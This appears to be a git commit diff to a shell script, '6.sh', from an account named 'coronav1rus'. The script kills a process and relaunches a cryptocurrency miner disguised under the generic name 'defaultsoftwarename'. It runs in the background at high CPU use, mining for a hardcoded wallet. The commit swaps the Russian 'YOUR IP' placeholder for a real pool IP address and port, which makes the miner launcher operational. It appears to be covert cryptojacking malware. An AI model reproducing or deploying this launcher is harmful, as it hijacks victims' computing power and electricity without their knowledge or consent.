f60da1e5e1849caeaee23ccdb93edb7a4443303c
coronav1rus <62151568+coronav1rus@users.noreply.github.com>
2020-03-13 17:33:45 +0000

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:3323 -u 47BfWrdYDpY8y5FaFn25kJK7soK5sLtcSYw2AtsHMo1TEJ7YETor8nMRU1jtYJjCdN8KUDz9BADsfVa58KNUNsJQCYAzAwH --pass=x:vasyan@mail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
+defaultsoftwarename -o 178.32.104.221:3323 -u 47BfWrdYDpY8y5FaFn25kJK7soK5sLtcSYw2AtsHMo1TEJ7YETor8nMRU1jtYJjCdN8KUDz9BADsfVa58KNUNsJQCYAzAwH --pass=x:vasyan@mail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
